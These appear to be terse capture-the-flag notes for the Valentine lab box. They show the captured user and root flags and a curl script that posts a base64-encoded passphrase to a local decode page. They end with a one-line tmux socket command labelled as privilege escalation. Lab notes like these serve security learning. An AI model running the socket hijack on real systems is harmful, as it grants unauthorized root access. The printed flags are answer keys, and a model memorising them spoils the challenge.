hype@Valentine:~/Desktop$ cat user.txt
e6710a5464769fd5fcd216e076961750


root@Valentine:~# cat root.txt                                                                                                       
f1bb6d759df1f272914ebbc9ed7765b2
root@Valentine:~# cat curl.sh
/usr/bin/curl -i -s -k  -X 'POST' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Referer: https://127.0.0.1/decode.php' -H 'Content-Type: application/x-www-form-urlencoded' \
    -b 'PHPSESSID=n12acqnj0efoq5etm5d12k6j85' \
    --data-binary $'text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' \
    'https://127.0.0.1/decode.php' >  /dev/null 2>&1



tmux privesc

/usr/bin/tmux -S /.devs/dev_sess